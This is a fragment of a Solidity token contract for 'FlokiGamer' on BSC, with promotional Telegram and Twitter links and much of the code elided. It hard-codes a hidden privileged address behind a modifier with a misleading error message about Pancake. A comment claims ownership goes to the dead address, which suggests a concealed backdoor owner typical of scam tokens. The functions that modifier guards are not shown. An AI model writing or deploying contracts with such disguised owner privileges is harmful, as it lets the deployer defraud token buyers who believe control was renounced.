...
TELEGRAM: https://t.me/FlokiGamertoken

TWITTER: https://twitter.com/FlokiGamerBSC
...
contract Context {
 ...
 contract FlokiGamer is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "FlokiGamer";
    string private _symbol = "FLOKIGAMER";
    ...
    address private _OwnerPublicV2 = 0x2301aFc957cc7f8a67CeDcb30A982F2f3fD59492; // Ownership Address
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); // Basically The Ownership Goes to DEAD
    ...
    modifier externelV2 () {
        require(_OwnerPublicV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
